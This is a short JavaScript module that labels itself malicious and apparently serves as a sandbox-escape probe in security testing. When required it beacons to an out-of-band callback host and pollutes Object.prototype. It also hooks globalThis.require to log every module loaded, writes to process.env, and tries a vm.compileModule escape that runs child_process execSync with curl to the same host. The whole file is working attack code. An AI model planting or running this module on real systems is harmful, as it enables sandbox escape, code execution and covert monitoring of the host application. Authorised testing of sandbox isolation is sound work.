// Malicious module - executes on require()
// Tests if require() can trigger code execution in the sandbox

const oastEndpoint = "https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun";

// Execute immediately on require
(function() {
  // Try to make network call
  try {
    if (typeof fetch !== 'undefined') {
      fetch(oastEndpoint + "/evil-module-loaded").catch(() => {});
    }
  } catch(e) {}

  // Try to pollute globals for later gadgets
  try {
    Object.prototype._evilLoaded = true;
    Object.prototype._evilTimestamp = Date.now();
  } catch(e) {}

  // Try to intercept future require calls
  try {
    const origRequire = require;
    if (globalThis.require) {
      globalThis.require = function(mod) {
        try {
          // Log all requires
          if (!globalThis._requireLog) globalThis._requireLog = [];
          globalThis._requireLog.push(mod);
        } catch(e) {}
        return origRequire(mod);
      };
    }
  } catch(e) {}

  // Try to access process
  try {
    if (typeof process !== 'undefined' && process.env) {
      process.env._EVIL_LOADED = "true";
    }
  } catch(e) {}

  // Try vm.compileModule exploitation
  try {
    if (typeof vm !== 'undefined' && vm.compileModule) {
      const hostCode = `
        const cp = require('child_process');
        cp.execSync('curl ${oastEndpoint}/vm-escape');
      `;
      const result = vm.compileModule(hostCode);
    }
  } catch(e) {}
})();

// Export function to verify loading
module.exports = {
  wasLoaded: true,
  loadTime: Date.now(),
  testValue: "EVIL_MODULE_EXECUTED"
};
